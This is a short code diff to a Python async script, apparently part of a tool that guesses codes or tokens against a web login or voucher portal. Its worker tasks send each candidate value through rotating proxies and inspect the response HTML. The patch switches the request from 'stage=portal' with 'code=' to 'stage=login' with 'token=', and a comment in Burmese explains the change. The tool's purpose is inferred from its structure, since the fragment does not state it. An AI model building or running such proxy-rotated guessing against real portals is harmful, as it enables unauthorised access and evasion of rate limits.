@@ -201,7 +201,12 @@ async def worker_task(worker_id, session, portal_url, chat_id):
             proxy = f"http://{proxy}"
             
         try:
-            target_url = f"{portal_url}&code={code_val}" if "?" in portal_url else f"{portal_url}?code={code_val}"
+            # stage=portal ကို stage=login သို့ပြောင်းပြီး token= ဖြင့် ပို့ဆောင်ရန်
+            clean_portal = portal_url.replace("stage=portal", "stage=login")
+            if "?" not in clean_portal:
+                clean_portal += "?"
+            
+            target_url = f"{clean_portal}&token={code_val}"
             async with session.get(target_url, proxy=proxy, timeout=3.0) as response:
                 html_content = await response.text()
                 lower_html = html_content.lower()
@@ -293,4 +298,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-                
